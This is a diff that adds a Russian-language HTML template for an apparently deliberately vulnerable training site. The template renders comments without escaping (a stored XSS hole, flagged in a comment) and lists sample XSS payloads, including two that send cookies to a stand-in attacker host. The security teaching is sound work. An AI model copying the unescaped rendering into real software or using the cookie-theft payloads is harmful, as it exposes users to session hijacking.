@@ -1,0 +1,86 @@
+<!-- templates/comments.html -->
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Комментарии с XSS</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Комментарии (XSS уязвимость)</h1>
+            <nav>
+                <a href="/">Главная</a>
+                <a href="/search">Поиск (SQL-инъекция)</a>
+                <a href="/login">Вход (SQL-инъекция)</a>
+                <a href="/comments">Комментарии (XSS)</a>
+                <a href="/safe-search">Безопасный поиск</a>
+                <a href="/safe-comments">Безопасные комментарии</a>
+                <a href="/demo">Демонстрация атак</a>
+            </nav>
+        </header>
+        
+        <main>
+            
+            <section>
+                <h2>Добавить комментарий</h2>
+                <form method="post" action="/comments">
+                    <div>
+                        <label for="username">Имя пользователя:</label>
+                        <input type="text" id="username" name="username" value="guest">
+                    </div>
+                    <div>
+                        <label for="content">Комментарий:</label>
+                        <textarea id="content" name="content" rows="4" placeholder="Введите ваш комментарий..." required></textarea>
+                    </div>
+                    <button type="submit">Отправить</button>
+                </form>
+            </section>
+            
+            <section>
+                <h2>Комментарии</h2>
+                {% if messages %}
+                <div class="comments">
+                    {% for msg in messages %}
+                    <div class="comment">
+                        <div class="comment-header">
+                            <strong>{{ msg.username }}</strong>
+                            <span>{{ msg.timestamp }}</span>
+                        </div>
+                        <div class="comment-content">
+                            <!-- УЯЗВИМОСТЬ: содержимое комментария выводится без экранирования -->
+                            {{ msg.content|safe }}
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <p>Пока нет комментариев.</p>
+                {% endif %}
+            </section>
+            
+            <section class="examples">
+                <h2>Примеры XSS для тестирования:</h2>
+                <ul>
+                    <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - простой alert</li>
+                    <li><code>&lt;img src="x" onerror="alert('XSS')"&gt;</code> - XSS через обработчик ошибок изображения</li>
+                    <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code> - XSS через iframe</li>
+                    <li><code>&lt;b onmouseover="alert('XSS')"&gt;Наведи на меня&lt;/b&gt;</code> - XSS при наведении</li>
+                </ul>
+                
+                <h3>Более опасные примеры:</h3>
+                <ul>
+                    <li><code>&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</code> - кража cookies</li>
+                    <li><code>&lt;script&gt;var i=new Image;i.src="http://attacker.com/"+document.cookie;&lt;/script&gt;</code> - отправка cookies на другой сайт</li>
+                </ul>
+            </section>
+        </main>
+        
+        <footer>
+            <p>Демонстрационный сайт для обучения безопасности. Никогда не используйте уязвимый код в продакшене!</p>
+        </footer>
+    </div>
+</body>
+</html>
